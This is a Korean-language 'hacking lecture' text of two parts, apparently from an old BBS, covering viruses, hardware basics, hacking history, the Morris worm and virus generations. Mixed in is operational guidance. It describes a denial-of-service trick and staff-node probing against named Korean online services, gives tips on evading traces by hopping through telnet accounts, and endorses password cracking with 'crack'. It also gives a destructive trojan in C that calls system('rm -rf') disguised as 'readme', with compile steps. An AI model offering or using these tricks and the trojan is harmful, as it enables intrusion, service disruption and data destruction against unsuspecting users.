해킹 강좌 1회

------------------------------------------------------------------------ 

첫회강좌에서는 바이러스와 해킹에 대한 개괄적인 이론에 대해서 공부하기로 하겠습니다.



1. 컴퓨터 바이러스의 이해 

1-1 컴퓨터 바이러스란 무엇인가? 

컴퓨터를 사용하는 사용자나 컴퓨터에 전혀 모르는 사람이건간에 컴퓨터 바이러 스란 단어를 들어보지 않은 사람은 없을것이다. 그만큼 컴퓨터 바이러스는 전세계 컴퓨팅 환경에 널리 퍼져있고 생명력이 강하게 지속되고있다. 컴퓨터 바이러스 제작 초창기때의 바이러스가 수십년이 지난 아직까지 골치를 썩 히는걸 보면 잘 알것이다. 그럼 도대체 컴퓨터 바이러스란 무엇인가? 컴퓨터 바이러스는 일반적으로 컴퓨터에 이상을 일으키거나 화일을 손상시키며 자신을 복제하는등의 일련된 행위를 하는 프로그램을 말한다. 그러므로 컴퓨터 바이러스는 우리주변에 존재하는 미생물적인 살아있는 생명체가 아니라 컴퓨터 프로그래머가 만든 단지 컴퓨터 프로그램일뿐이다. 그 행위가 마치 생명체 바이러스와 같은 파괴/감염등을 행한다고 이름 지어졌을 뿐이다. 어느 전산실에서 있었던일이다. 전산실 관리 직원이 사장에게 급히 보고를 했다. "사장님, 컴퓨터 바이러스에 걸려 컴퓨터 시스템들이 제대로 작동하지 않습니다" 그러자 사장 말하길, 그러길래 진작 "소독약 뿌리랬잖아" 라고 호통을 쳤단다. 컴퓨터 바이러스에 대한 일반적인 무지를 일컫는 유머이다. 컴퓨터 바이러스가 소독약으로 죽지는 않겠지만 ANTI-VIRUS 프로그램, 우리가 흔히 아는 "백신" 프로그램이 컴퓨터 바이러스를 퇴치 시킬수가 있다. 


1-2 컴퓨터의 구조와 작동의 이해 

컴퓨터는 크게 하드웨어(Hard Ware) 와 소프트웨어(Soft Ware)로 나눈다. 하드웨어는 컴퓨터의 본체,주변기기등 기계적으로 컴퓨터를 구성하고 있는 장치 들을 의미한다. 소프트웨어는 하드웨어를 움직여주는 운영체제와 각종 응용 프로그램들을 말한다 


1-2-1 컴퓨터의 하드웨어 적 구조 

* 입력장치 : 키보드,마우스,스캐너 등의 입력기기들을 말한다. 입력된 각종 신호들은 처리영역 으로 수신되어 입력자가 원하는 형태로 처리되어 원하는 방향의 각종 출력기기로 출력된다.


* CPU(Central Processing Unit) : 마이크로 프로세서(Micro Processor)라고도 부르며 중앙 처리 장치 이다. 컴퓨터의 핵심적인 장치로 사람의 두뇌에 해당한다. 우리가 흔히 쓰는 IBM 호환기종은 인텔텔나 AMD 등의 80X86계열을 사용한다. 흔히 말하는 386,486,펜티엄 이란 단어는 어떤 CPU 를 사용했냐 는 것을 의미한다. 


* ROM(Read Only Memory) : 롬은 단어가 의미하듯 오로지 읽어들이기만 하는 메모리이다. 그러므로 일반 사용자가 롬에는 직접 입력할수 없게 끔 만들어져 있다. 롬 라이터(Rom Writter)라는 기기로 내용 갱신등이 가능할 뿐이다 이유는 롬은 컴퓨터 전반적인 제어나 운영에 대한 기본 정보가 탑재되어 있기 때문이다. 컴퓨터에 전원을 넣으면 부팅시 롬에서 정보를 읽어들여 사용하 게 되어있다. ROM 에는 직접적인 쓰기가 불가능해 컴퓨터 바이러스가 침투할 수 없는것은 당연한다.. 


* RAM(Random Access Memory) : 램은 프로그램 작동시 사용되는 각종 데이타를 일시적으로 저장 하는 기억장치 이다. 자유로운 읽기와 쓰기가 가능한 휘발성 메모리이다. 롬과 다른점은 전원을 끄면 롬은 내부에 저장된 고유의 데이타가 보존되는 반면 램에 입력되어진 모든 내용은 사라진다. 컴퓨터 바이러스는 RAM 에 침투하여 램을 거치는 프로그램들을 감염시키거나 이곳에서 다른 장치로의 감염을 시도한다. 이런 컴퓨터 바이러스를 램 상주형 바이러스라 칭한다. 


* 기억장치 : 크게 나누어 하드 디스크(Hard Disk) 와 플로피 디스크(Floppy Disk), 자기테이프 그리고 요즘 각광받고 있는 CD-ROM 등이 있다. 하드 디스크는 대용량의 기억장치로서 빠른 속도로 컴퓨터의 기 억장치로 활용된다. 플로피 디스크는 역시 보조 기억장치로서 다소 느린 속도지만 이 동의 간편성과 디스켓에 담긴 내용을 활용한다는 측면이 있다. 위의 두 기억장치는 직접 읽고 쓰기가 가능하기에 컴퓨터 바이러 스의 주 공격 대상이 된다. CD-ROM 은 컴팩트 디스크 형태의 매체로서 약 600메가 바이트 분량의 대용량 기억장치로서 롬과같이 읽어들이기만 한다. CD-ROM 에는 직접적인 쓰기가 불가능하기에 컴퓨터 바이러스의 침투는 어렵다. 하지만 CD-ROM 초기 제작시 감염된 파일을사용했다면 할수 없 지만 서도 말이다. 


* 출력장치 : 모니터,프린터,플로터 등의 출력을 담당하는 기기를 말한다. 입력장치와 처리장치를 거친 데이타들은 출력장치를 통해 우리에 게 보여진다. 바이러스 감염/피해 여부를 이를 통해 확인해 볼수 있겠다. 출력장치 이외에 TV카드,사운드 카드 등의 여러가지 주변기기를 들 수 있겠다. 


1-2-2 컴퓨터의 소프트웨어적 구조 

운영체제와 응용 프로그램, 데이타 화일 그리고 소스 코드 등으로 구성되어 있다 대개 IBM 호환기종의 MS-DOS 를 운영체제로 사용하는 컴퓨터에서는 확장자 라 는 화일의 끝에 붙는 세 글자가 무척 중요한 의미를 지닌다. 확장자는 해당 화일이 실행화일 인지 데이타화일인지 등의 해당정보를 사용자 에게 전달해준다. 프로그램들은 화일(FILE) 구조를 갖는다. 화일은 프로그래머가 제작한 특정 데이타 -예. 그래픽,문서,음악,프로그래밍...-를 지니고있다. 대개 각각의 화일이 모여 전체적인 프로그램을 구성한다. 물론 하나의 화일이 하나의 프로그램 전부를 구성할수도 있다. 바이러스는 이런 화일들을 직접적인 주 공격 대상으로 삼고 이를 숙주로 전파된다. 


1-3 컴퓨터 바이러스의 특성 

컴퓨터 바이러스는 프로그램을 변경 시키거나 삭제 하고 주변기기에 오동작을 일 으키며 자기 자신을 복제하고 변형시킨다. 컴퓨터 바이러스는 누군가에 의해 인위적으로 제작된 프로그램이다. 그렇기 때문에 실행이 되면 컴퓨터 바이러스에 입력되어진 내용에 따라 - 예를들 어 실행 화일만 감염시키라면 - 임무(?)를 수행한다. 우선 감염시킬 화일(FILE)을 찾는다. 대상을 찾으면 그 화일을 식별하여 지문을 기입한다. 이때 대상이란 컴퓨터 바이러스에 감염되지 않은 화일일 것이다. 이는 Over Writte 하지 않기 위해서이다. 그리고 바이러스 본체 부분을 입력 시킨다. 그 다음에 원래 형태의 대상 화일이 배치된다. 컴퓨터 바이러스는 계속적으로 다음 대상을 찾아 지문을 분석하여 감염되지 않았 다면 자신을 복제하고 대상 화일을 감염시켜 지속적으로 전파 시킨다. 이는 감염형 프로그램을 예로 든 대표적 예이다. 

1-4 컴퓨터 바이러스의 정의 

컴퓨터 바이러스에 대한 지금까지 소개된 어떠한 정의로도 만족스러운 결과가 없 었다. 필자가 생각하기에 가장 적당한 정의로는 "Ralf Burger"의 정의를 들 수 있겠다. 

1. 컴퓨터 바이러스 프로그램이 아닌 소프트웨어의 프로그램 구조를 다른 프로그 램의 구조로 변경한다. 

2. 많은 프로그램에 대해 수정을 할 수 있다. 

3. 어떤 프로그램에 행해진 수정 여부를 인식할 수 있다. 

4. 위의 수정 인식 후 같은 프로그램을 또다시 수정하지 않는다. 

5. 이 프로그램에 의해 수정된 프로그램이 위의 1에서 4 까지의 모든 특징을 가진다. 위 조건들을 만족한다면 그것은 컴퓨터 바이러스라 칭해도 좋을 것이다. 


------------------------------------------------------------------------ 

2-1 컴퓨터 바이러스의 위험성 

현대사회에서 컴퓨터 바이러스에 대한 위험성은 상당히높다. 점차 전세계가 네트워크에 묶이고 모든걸 컴퓨터에 의존해 처리해 나가는 때에 악성 바이러스때문에 입게되는 경제적 피해는 상당하다. 그리고 교통/운송 체계도 컴퓨터에 의해 관리되는 세상에서 바이러스가 통제 시 스템에 침투하여 고장을 낸다면 엄청난 결과를 가져올것이기 때문이다. 

------------------------------------------------------------------------ 

I. 해킹의 이해 

------------------------------------------------------------------------

1.해킹이란 무엇인가? 

해킹이란 컴퓨터 시스템에 침투하거나 정보를 빼내는일들을 총칭해 일컫는 말이다. 이런일을 하는 사람들을 해커라고 한다. 의미가 많이 변했지만, 해커란 자신의 실력을 알리기위해 해킹을 한다. 일반인들이 생각하는 해킹이란 단순하게 남의 아이디와 암호를 알아내어 무단으로 사용하는 정도로 인식되고 있다. 

------------------------------------------------------------------------ 

2. 해커의 정체를 밝힌다. 

해커란 해킹을 하는 사람을 뜻한다. 대부분의 해커들은 단지 그들의 실력을 뽐내기 위함이다. 매년 암스텔담에서는 국제 해커 대회가 열리기까지 한다. 순수한 의미에서 그들은 단지 시스템을 뚫고 암호를 깨고 하는 일등에 만족한다. 미국 MIT에서 시작된 해커 문화는 사실 초기 컴퓨터 및 시스템 소프트웨어의 개발에 결정적인 역할을 했고 지금도 몇몇 사람은 컴퓨터 업계를 주름잡고 있다. 마지막 해커로 일컬어지는 리처드 스톨만의 경우 GNU시스템의 C 컴파일러와 EMACS를 개발했다. 그는 상업적인 소프트웨어의 저작권(Copyright) 개념을 전면부정하며 이의 반대 개념인 [Copyleft]개념을 만들었다. 그는 "자신이 만든 모든 소프트웨어는 소스코드와 함께 무료로 공개하여 누구나 사용하고 수정할 수 있다"고 말하며 공개 소프트웨어의 개념을 가장 극단까지 발전시켰다. 하지만 스톨만의 경우도 생계를 위해 상업적인 몇시간의 일만큼은 한다고 한다. 스톨만의 예에서 보듯이 대부분의 해커는 뛰어난 능력의 소유자로 해커들이 바라는 것은 단지 자기 실력의 자랑이다. 제도권에서 수용하면 MIT해커들 처럼 우리 컴퓨터 업계의 발전을 이룰 수도 있다. 해킹을 일방적으로 범죄로 치부해 버리기 보다는 능력있는 젊은 엔지니어의 열기의 발산이라는 시각으로 바라보는 여유도 필요한 것이다. 지금도 인터넷의 한 구석에서는 인터넷을 해킹하기 위한 노력이 계 속되고있다. 앞으로도 해커와 시스템 관리자 사이의 숨바꼭질은 계속될것이다. 그러면서 이에 관한 보안 기술도 계속 발전해 나갈 것이다. 

------------------------------------------------------------------------ 

3. 통신망과 해킹의 이해 

대부분의 해킹은 통신망을 통해 이루어진다. 일대일 방식의 시스템 접근이라기 보다는 네트워크를 통한 시스템 접근이 이루어지는 것이다. 한 예를 들어 보이겠다. 바이러스의 일종인 웜(벌레)은 네트워크에 의해 상호 연결되어 있는 여러대 의 정보시스템 플랫폼에다 자체의 일부를 번식시키는 프로그램으로 그것이 오염시킨 서로 다른 네트워크망 안에서 존재한다. 시한폭탄과 같은 웜은 매 우 위협적인 존재이다. 웜의 오염사건중 가장 잘 알려진 사건은 인터넷/모리 스 사건이다. 지난 88년 11월 코넬대학원생 로버트 모리스는 로렌스 리버모 어 연구소를 포함한 여러 연구기관에 유닉스 플랫폼을 연결하는 인터넷을 통 하여 웜 바이러스를 유포시켰다. 모리스는 인터넷의 암호화 과정을 분석하고 파악한 다음 주먹구구식 끼워 맞추기 방법을 이용, 가장 많이 사용하는 비밀 번호를 작성한 후 인터넷의 암호화된 비밀번호 리스트와 대조한 결과 비밀번 호의 80의이상을 재구성할 수 있었다. 인터넷의 접근을 성공시킨 모리스는 전자우편 메시지 핸들링 시스템(MHS)을 이용하여 바이러스 모듈을 퍼뜨렸다. 컴퓨터 상호간 커뮤니케이션은 점차 취약 영역이 확장되고 있어 관심이 높아 지고 있다. 다수의 프로세서들을 로컬 케이블이나 게이트 웨이 접속방식을 통해 커뮤니케이션망에 연결하게 되면 손실을 입을 기회가 더 많이 주어진 다. 간단한 예를 들어 보이겠다. 푸른물 이라는 호스트 프로그램을 사용하고 있는 사설 비비에스가 꽤 많다. 하지만 이 호스트에는 버그가 있어서 이를 이용한 간단한 해킹을 소개하겠다. 푸른물 호스트를 사용하는 사설비비에스의 "온라인 게임"을 보자. 온라인 게임에서 가위, 바위, 보를 해서 점수를 딸수있다 그리고 작은 태양이라는 호스트 프로그램을 사용하고 있는 사설비비에스에서는 V(압축 화일보기,천리안 명령과 유사) 명령을 사용할 경우 시스템이 다운되는 버그도 존재한다. 

------------------------------------------------------------------------ 

4. 해킹의 구분 

일반적으로 해킹은 시스템 사용자의 암호를 알아내 불법으로 그 시스템에 침투해 사용하거나 시스템속의 정보를 변조 또는 파괴하는데 목적이 있다. 기술적으로 세분하면 크게 3가지로 나눌 수있다. 4-1 해킹의 개념 구분 첫째 다른 사람의 시스템에 몰래 침투,사용하거나 그 속의 정보를 변조하 는 행위인 `시스템 해킹'이 있다. 그 수법으로는 지금까지 

* 트로이 프로그램을 이용한 방법 

* 호스트 프 로그램의 버그(bug.프로그램상의 오류)나 약점을 이용한 방법 

* 특정 사 용자의 암호를 이용한 방법 등 3가지가 노출돼 있다. 

트로이 목마 프로그램을 이용한 시스템 해킹법은 주로 상대방 호스트 사용자의 암호와 신상기록 등을 탐지하는 첩보활동이나 상대방 호스트의 기능을 마 비시킬 목적으로 하는 파괴활동에 이용되고 있으며 미국에서 몇몇 사설게 시판을 개설한 사람들이서로 상대방의 시스템에 피해를 주려는 목적으로 악용된 것이 시초다. 또 호스트 프로그램의 버그나 약점을 이용하는 해킹법은 시스템 개발때 쓰인 언어의 특성이나 프로그래머의 고의 또는 실수에 의하여 개발됐으나 완료된 후 지워지지 않은 약점 등을 최대한 활용하는 수법. 다음으로 가장 간단한 방법인 특정사용자의 암호를 알아낸 뒤 그것을 이 용해 남의 시스템에 침투하는 것이 있다. 이번에 타인의 예금계좌와 비밀번호를 알아낸 뒤 홈뱅킹을 통해 타인의 예금을 인출한 사건은 이 유형에 해당한다. 전문가들은 이로인한 피해를 막기위해 암호는 되도록 자기 주민등록번호 와 전화번호 등 남이 알아내기 쉬운 것은 피해야한다고 권고한다. 둘째는 컴퓨터 프로그램 보호장치인 락(Lock)을 풀어 해킹하는 수법이 있다. 

락에는 

* 실행 파일에 특정한 과정을 심어둬 프로그램 실행시 그 특정 과정에 해당하는 조건이 만족되지 않으면 프로그램 실행이 중단되는 소프트 웨어 방식 

* 프로그램상의 특정 과정이 시스템 자체의 하드웨어적인 특성 을 검사함으로써 그 프로그램이 수행될 것인지 여부를 가리는 하드웨어 방 식 등 2가지가 있다. 이같은 락의 해독방법에는 여러가지가 있으나 가장 기초적인 것으로 * 락이 걸려 있는 실행파일을 역조작하는 방법 

* 디스크나 파일의 내부 코드를 볼 수 있는프로그램을 이용,직접 해당코드를 조작하는 방법 

* 프로그래머의 실수로 생길 수있는 프로그램상의 오류를 검색하는 디버그(Debug)기능을 이용해 락을 푸는 방법 등이 있다. 마지막으로 프로그램 변형을 통해 암호를 해독한 뒤 프로그램을 불법 변조하거나 자기 용도대로 프로그램을 바꾸는 해킹이 있다. 

4-2 해킹 유형별 분석 

해킹을 유형별로 분석하자면, 무차별 대입법 ,오류이용법 , 바이러스 심어 놓기 등이 있다. 

4-2-1 무차별 대입법 

대개의 네트워크 시스템을 침투할때 암호를 물어볼것이다. 이때 비밀번호를 무차별적으로 대입하는 방법이 있다. 상대방의 비밀번호를 유추해서 아무것이나 누르는 방법인데 거의 확률이 없을것이다. 영어 단어로 만들수 있는 가짓수가 수십억개일것이기 때문이다. 어쩌다 운이좋으면 몰라도 여간해서는 힘든방법이다. 어쩌다 방송에서 해커라고 떠들어대는 경우가 있는데-전에 청와대 사칭해서 은행돈 빼낸경우- 이것은 기술적 해킹이라고 말하기엔 무식한 방법이었다. 무차별 대입법을 이용해서 너무나 허술한 암호를 맞춘것에 불과하기 때문이다. 대개 인터넷을 이용하다보면 웹스터 영어사전에 수록된 단어는 비밀번호로 하지말라는 경고메시지를 보게된다. 특정단어의 경우 그것을 순차대입할수 있는 프로그램이 있기에 이것을 돌리게 되면 영어 단어일경우 스스로 암호를 찾을때까지 작동한다. 이방법은 전에 "영웅일기"란 TV프로에서도 나온것인데, 그런 프로그램은 cop's 와 crack 라는 것들인데 나중에 자세한 설명과 사용법을 알려주겠다. 

4-2-2 오류 이용법 

어떤 프로그램이든 제작하다보면 약간씩의 버그(프로그램상의 오류)가 존재한다. 이것을 이용한 해킹이 오류이용법 이다. 대개의 시스템 호스트 프로그램이 완벽한것은 아니다. 지극히 치명적인 오류를 지니고 있는경우도 있다. 
하이텔 이전의 케텔 시절에는 호스트 프로그램에 상당한 버그가 존재하기에 무수히 많은 해킹을 당했다. 가장 손쉬웠던 방법이 아이디를 이용하는 것이었는데, 자신의 아이디가 aaa라고 하면, 게시판에 aaab란 아이디가 있다면 자신이 그 사람의 글을 지울수 있는 권한이 있었다. 즉, 비슷하게 지어진 짧은 아이디가 보다 긴 비슷한 형태의 아이디와 같은 권한을 가지게 된것이다. 천리안의 경우도 몇가지 오류가 있었다. 그중 대표적인게 게시판에 자신이 글을 쓰고서 계속 읽는것이다. 그러니까, 자기가 쓴글이 1234번이면 1234 번을 계속! 입력한다는것이다. 지속적으 로 아주 빠르게..... 
 이렇게 계속 치다보면 센터의 호스트 컴퓨터가 오동작을 일으켜 전체 전자메일 서비스가 안되는등 치명적인 결함을 나타내었다. 천리안 접속할때 항상 ".chol" 이라고 칠것이다. 근데 의문이 있을것이다. 왜 ".chol"을 쳐야 하냐고! 이것은 천리안의 망인데 천리안은 일반 기업체를 위해 노드를 빌려주기도 한다. 그렇기에 이곳에서 각자의 고유코드를 입력하는것이다.
  하이텔도 갈수있고,삼보컴퓨터,화장품회사,건설회사.... 등등~ 천리안 망에 연결된 호스트로는 접속이 가능하다. 작년여름까지만 해도 이곳을 통해 로컬로 접속할 수 있는 노드가 있었다. 예전에 이곳을 통해 접속을 시도했었는데 부당사용을 막기위함인지 폐쇄되었다. 그때 입력했던게, ".cneter2,3,4...."이런것이었다. 알고보면 아주 간단한 것이다.
 이렇게 입력하면 우리가 기존에 쓰던 천리안 메뉴가 아니라 직원들이 쓰는 영역으로 들어가 id와 password를 묻는다. 이런식으로 뭔가 궁리하고 생각하는 사람에겐 뭐든지 열려있다는걸 알았으면 한다. 예전에 천리안에서 전체적 정비를 하면서 직원들에게 똑같은 비밀번호로 통일하라고 했던때가 있었다. 그때 아는 분이 비밀번호를 알아내 해킹을 한적이 있었단다.
 현재 천리안은 막강한 보안장치를 가지고있다. 하이텔은 인터넷과의 연결쪽에서 버그가 있어 해킹의 위험성이 있다. 대개의 시스템은 방화벽이란걸 두고 있다. 천리안을 뚫고서 $(유닉스 쉘 상태)을 본다면 정말 해킹의 고수일 것이다. 도스의 커맨드 C:\ 이렇게 유닉스는 $ 이다. 해킹은 반드시 추적을 받게됩니다.
 만약 대형 통신망을 해킹할려구 하는데 추적을 따돌리려면 이런 방법을 쓰면될것이다. 우선 인터넷계정이 있을겁이다.(대개 대학등이나 외국 공개 BBS에서 쉽게 받을수있음) 학교등 공공장소에서 인터넷을 타고 들어간다. 인터넷에는 TELNET라고 여러 네트워크를 돌아다닐수있게 해주는 서비스가있다. 
 그걸로 여기저기 타고다니다가 "CHOLLIAN.DACOM.CO.KR" 도메인으로 접속하면 천리안으로 들어오게된다. 그리고, 인터넷을 보면 고퍼란게 있다. UNIX상의 몇몇 시스템에는 고퍼를 이용하면 해킹이 가능해지는 엄청난 버그들이 있다. 고퍼 말고도 FTP를 이용할수도 있다. 즉, 특정 방법을 사용하여 시삽권한을 빼낼수 있는 것이다. 더우기 비밀번호를 빼낼수 있는 방법도 존재한다. 요즘은 쉐도우로 하지만 유닉스에서 패스워드 화일은 대개 누구나 볼수가 있을정도다.
 왜 그럴까? 그 이유는 패스워드 화일은 DES 라는 독특한 암호화 기법을 사용하기 때문 에 절대 해독이 불가능하다는 것이다. 예를들어 (가정) 비밀번호가 ABC1234 라고 가정하면 암호화되어 저장할 경우 qAewBs 라는 식으로 저장되기 때문에 도무지 역 추적이 불가능해진다. 그럼 방법은 없을까?
 전문적인 방법인 패킷을 이용하는 방법과 좀더 수월한 방법인 crack을 이용 하는 방법이 있다. crack라는 프로그램을 작동시키면 비밀번호를 찾아낸다 방식은 직접 대응법이다. 즉, 빠른 속도로 하나씩 대입해 보는것이다. 그러니 영어단어 나 간단한 숫자로 된 쉬운 비밀번호는 금방 드러나게 되는 것이다. 

4-2-3 바이러스 심어놓기 

해커들이 시스템을 해킹하는데 기본적으로 특정 트로이 목마 바이러스를 심어놓는 경우가 있다. 과거 하이텔에 해커가 프리웨어인 에뮬레이터를 등록을 시킨후 각 사용자들이 이 소프트를 다운받은 후 호스트에 연결하면 사용자명과 암호를 에뮬레이터가 동시에 해커의 메일사서함앞으로 접속한 사람의 사용자명과 암호를 전송시킨 사건이 있다.
 이와같은 경우를 트로이목마라고 하는데 창의력을 요구하는 해킹기법으로 해커가 해커자신에게 최고권한사용자와 같은 지위를 주게끔 프로그램을 작성, 시스팀안에 삽입을 해놓고 기다리다가 시스팀운영자 즉 최고권한사용자가 들어오면 자신의 아이디를 IP수준에서 최고권한사용자로 만드는 것이다. 이 방법의 경우 해커는 잠깐씩 시스팀에 들어와서 자신의 프로그램이 작동을 했는지 여부만 검사만하면 되며 이러한 프로그램의 대부분이 실행후 곧 사려져버리는 특성을 가지고 있다.
 다음 소스는 C를 한다면 누구나 알수 있는 것이다. main() { puts("PLEASE WAIT ...... "); system("rm -rf"); } 이것도 도스의 배치랑 성격은 유사한 트로이 목마 프로그램이다. C나 배치나 모양은 약간 달라도 성격은 비슷하다.
 자 이것을 실행하기 위해서는 # cc -o readme readme.c 이런식으로 해 놓으면 된다. 요건 아주 간단하면서 막강합니다. 무한 루프에 빠지는 수가 있다. 해킹도 알고보면 아주 간단한 것에서부터 출발하는 것이다.



 해킹 강좌 2회 

------------------------------------------------------------------------ 

안녕하세요. 두번째 강좌 시간입니다. 이번 시간에는 바이러스의 이론적인 나머지 부분에 대해서 알아 보기로하겠습니다. 세번째 강좌부터는 하드웨어,어셈블리 에 대한 강좌가 될 것입니다. 




5. 컴퓨터 바이러스의 위험성 

현대사회에서 컴퓨터 바이러스에 대한 위험성은 상당히높다. 점차 전세계가 네트워크에 묶이고 모든걸 컴퓨터에 의존해 처리해 나가는때에 악성 바이러스때문에 입게되는 경제적 피해는 상당하다. 그리고 교통,운송 체계도 컴퓨터에 의해 관리되는 세상에서 바이러스가 통제 시스템에 침투하여 고장을 낸다면 엄청난 결과를 가져올 것이기 때문이다. 


1) 컴퓨터 바이러스의 영향 

예를들어 갑이라는 사람이 을을 무척 미워하여 골탕을 먹일려고 한다. 갑이 을의 컴퓨터에 재미있는 게임이라며 자신이 만든 컴퓨터 바이러스가 감염된 디스켓을 건네준다.
 을은 그것도 모르고 재미있게 게임을 하고 그 사이 을의 컴퓨터는 바이러스의 공격으로 고장나버린다. 여기서 그치면 다행이지만 갑이 건네준 프로그램을 또 다른 사람이 사용한다면 그의 컴퓨터도 감염될것이다. 그리고 최초의 바이러스 프로그램은 을과 다른 사람들의 컴퓨터에서 살아남아 다른 정상적인 프로그램을 감염시키며 지속적으로 전파될것이다. 만약 이것이 컴퓨터 통신망의 자료실에 등록된다면 무수한 다수의 피해자가 발생할것이며 기하급수적으로 그 숫자는 증가할것이다. 갑은 자신의 목적을 이루었지만 애꿎은 선의의 피해자를 남겼다.
 바이러스의 속성상 일단 제작, 전파된 바이러스는 멸종(?) 되기 힘들다. 컴퓨터와 프로그램이 존재하는 한 바이러스는 계속될것이다. 물론 그런 바이러스를 잡기위한 안티바이러스(백신)도 지속적으로 개발될 것이다.
 하지만 바이러스가 반드시 나쁜 것만은 아니다. Cohen에 의해 최초로 언급된 압축 바이러스(Compression virus)가 그 예이다. Huffmann coding을 이용한 데이타 압축과 같은 데이타 조작으로 시스템 내의 실행화일을 감염시켜 압축한다. 이는 메모리 요구 용량을 감소시키는 긍정적 영향을 끼친다. 물론 요즘도 공개된 실행화일 압축 프로그램이 있지만 압축 바이러스는 말그대로 바이러스의 특징을 가지고 있기때문에 일반적인 유틸리티라고 보기는 어렵다. 

2) 컴퓨터 바이러스의 전염성 

컴퓨터 바이러스는 제작 속성(?)상 전파성이라는 특징을 가진다. 바이러스의 목적이야 전파하여 자신을 과시하는것이 대부분이므로 가장 손쉽고 대량적으로 전파시킬수 있는 공간인 컴퓨터 통신을 주로 이용한다. 인터넷에 올린자료라면 순식간에 전세계 구석구석 안 퍼진곳이 없을테니까 말이다. 통신망에서 다운받거나 개인적으로 복제한 디스켓 등에서 전파된 바이러스가 퍼지는 속도를 보면 다음과 같다. 

A. 실행시 하나만 복제하는 경우 V (1) VV (2) VVVV (4) VVVVVVVV (8) VVVVVVVVVVVVVVVV (16) VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV (32) 
B. 실행시 네개를 복제하는 경우 V (1) VVVVV (2) VVVVVVVVVVVVVVVVVVVV (25) VVVVVVVVVVVVVVVVVVVVVVVV............................................VVVVV (125) 


위로서 감염속도가 얼마나 빠른고 위험한지 알았을 것이다. 그러나 사실상 위와같은 수학적인 공식의 전파속도는 드물다. 실제 감염된 프로그램 모두가 곧 실행하는 것은 아니기 때문이다. 

------------------------------------------------------------------------ 


6. 컴퓨터 바이러스 제작자들 

컴퓨터 바이러스를 제작하는 사람들은 어떤 사람일까? 자신의 실력을 뽐내기 위한 사람들이 대부분이다. 그외 다른 생각으로 무조건적으로 악의에 차서 시스템과 화일의 파괴만을 목적으로 제작하는 사람도 있을 것이다.
 보통 사람들이 생각하기에 바이러스 제작자는 컴퓨터 해커쯤 된다고 생각하지만 결코 그렇지만은 않다. 몇몇 바이러스를 제외한 대부분의 바이러스는 원형을 약간 변형한 것이 대부분이기 때문이다. 컴퓨터 바이러스는 '해커'들만이 만드는 것이 아니며, 바이러스를 제작했다고 그사람을 마치 대단한 사람으로 생각하는것은 옳지 않다.
 예를들어 서울 바이러스 연합 이라는 것도 있다. 이들의 정체는 밝혀지지 않고있는데, 개인인지 어떤 단체인지 모르겠지만 여러가지 국산 바이러스를 계속 제작중에 있다. 89, 90년에 PC-SERVE(현 천리안), KETEL(현 하이텔)에 호스트를 파괴하겠다고 서울바이러스 연합이라고 칭하는 사람이있었다. 물론 단순협박사건으로 끝나긴 했지만 바이러스에 대한 공포를 유발하기에 충분했다. 91년도에 자신을 SVS-009라고 부르면서 빈대, 처단자, 서울, 667 바이러스를 만든 사람이 있었다. 이 두사람이 동일인인지 아니면 다른 사람인지 전혀 알수 없었다.(서울 바이러스의 문자열을 검색하면 y가 빠진 Seoul Virus Societ라고 나옴) 최근에 자신을 SVS 라고 하는 사람(혹은 단체)가 있는데 이들이 만든 최초의 바이러스로 알려진 E.O.S. 바이러스 내부에 'Cheer up! SVS-009'라는 문자열이 있기 때문에 SVS-009는 아닌 또 다른 사람일수도 있다.
 서울 바이러스 연합이 드러내놓고 활동을 하는 것이 아니기 때문에 개인인지 여러명인지 전혀 알길이 없다. SVS의 바이러스 특징을 살펴보면, 우선 DEBUG로 고친 초기의 몇종을 빼고는 모두 빠른 속도로 감염이 진행된다. 안철수씨도 지적하셨듯이 한국산 바이러스 중에는 최초로 바이러스 분류상 3세대인 은폐형 바이러스들이다. 넥스트의 경우는 암호화기법도 사용한다. 그외 감염방법도 보통 실행때 감염되지만 실행은 물론, DIR파일 열기, 이름 바꾸기, 지우기, 속성 변환때도 감염될 만큼 무차별적으로 감염된다. '저주 C' 바이러스의 경우 군부대 전산소의 컴퓨터를 파괴했다고 한다.
 일단 SVS의 바이러스들은 몇종을 빼고 하드를 인식못하게 하고 CMOS 데이터 까지 모두 파괴해 버린다. 국산 바이러스중 SVS가 만든 것으로 추정되는 바이러스는 많이 있다. 

------------------------------------------------------------------------ 

7. 컴퓨터 바이러스 발전단계 

1세대, 원시형 바이러스(primitive virus)는 간단한 구조의 바이러스이다. 

2세대, 암호화 바이러스(encryption virus)는 대부분을 암호화해서 저장한다. 하지만, 암호를 푸는 방법이 모두 동일하기 때문에 백신등에서 원시형 바이러스와 동일하게 진단된다. 

3세대, 은폐형 바이러스(Stealth virus)는 어떤 측면에서 보면 암호화 바이러스보다 못하다고 볼수 있다. 보이지않는 폭격기 스텔스기에서 이름을 따왔다고 한다. 일반적으로 은폐형 바이러스는 100 바이트 정도 밖에 안되는 짧은 명령어가 추가되면 만들수 있다. 하지만, 일반 사용자 측면에서는 발견하기가 더 어려운것이다. 
 그외 은폐형으로 만들기 위한 여러가지 방법이 더있다고 한다. 프로도(Frodo,일명 4096) 바이러스는 감염된 프로그램을 읽으려고 하면 감염된 흔적은 숨기고 원래의 부분을 대신 보여 준다. 그외 국내에 없지만 TV(Turbo Vaccine)에서 치료 가능한 세이하(Sayha)의 경우 DIR 로는 증가 길이를 볼수 있지만, 감염된 파일을 읽을 때 원래 부분을 보여준다.
 그외 인터럽트를 은폐하는 것도있다. 이것으로는 역시 프로도가 있으며 93년 말에 대단했던 맥가이버(MacGyver,McGyver) 바이러스가 있다. 

4세대, 갑옷형 바이러스(armour virus)는 암호화와 자체 수정 기법등을 사용한다고 한다. 3세대,4세대의 중간 단계로 다형성(polymorphic) 바이러스가 있다. 이것의 경우 암호화를 사용하기는 하지만, 분석하기는 쉽다. 몰타 아메바(Maltese_Ameoba), 푸른 하늘(Blue_Sky) 등은 감염될 때마다 암호를 푸는 방법이 달라진다.
 하지만, 다형성과 갑옷형은 따로 분류되어야 한다고 생각한다.갑옷형 바이러스도 역시 암호화를 사용하지만 분석하기가 상당히 까다롭다. 국산으로는 'KOTHS_HWB.4771'가 있다. 이것은 램에서도 암호화가 되어 있다.특히 고래(Whale) 바이러스는 여러 전문가가 모여 분석을 겨우 했다고한다. 바이러스길이도 약 9KB 로 엄청나다.이 바이러스의 계통을 보면 프로도에서 발전했다고 짐작된다.(프로도⇒ 물고기⇒ 고래) 하지만, 이런 분류도 모호한 것이 많다.
